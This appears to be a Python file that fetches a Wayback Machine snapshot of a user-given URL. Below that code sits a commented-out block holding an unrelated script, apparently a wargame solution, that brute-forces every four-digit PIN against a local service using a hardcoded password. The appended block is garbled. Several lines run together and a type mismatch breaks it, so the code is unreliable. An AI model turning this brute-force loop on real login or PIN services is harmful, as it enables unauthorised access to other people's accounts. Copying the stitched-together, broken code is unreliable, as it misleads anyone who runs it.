import webbrowser
import json
from urllib.request import urlopen

print("Let's find an old website.")
site = input("Type a website URL: ")
era = input("Type a year, month, and day, like 20150613: ")
url = "http://archive.org/wayback/available?url=%s&timestamp=%s" % (site, era)
response = urlopen(url)
contents = response.read()
text = contents.decode("utf-8")
data = json.loads(text)
try:
    old_site = data["archived_snapshots"]["closest"]["url"]
    print("Found this copy: ", old_site)
    print("It should appear in your browser now.")
    webbrowser.open(old_site)
except:
 	print("Sorry, no luck finding", site)

'''
#!/usr/bin/env python3
# coding: utf-8import sys
import socketpincode = 0
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"try:
    # Connect to server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 30002))
    
    # Print welcome message
    welcome_msg = s.recv(2048)
    print(welcome_msg)    # Try brute-forcing
    while pincode < 10000:
        pincode_string = str(pincode).zfill(4)
        message=password+" "+pincode_string+"\n"        # Send message
        s.sendall(message.encode())
        receive_msg = s.recv(1024)        # Check result
        if "Wrong" in receive_msg:
            print("Wrong PINCODE: %s" % pincode_string)
        else:
            print(receive_msg)
            break
        pincode += 1
finally:
    sys.exit(1)
    '''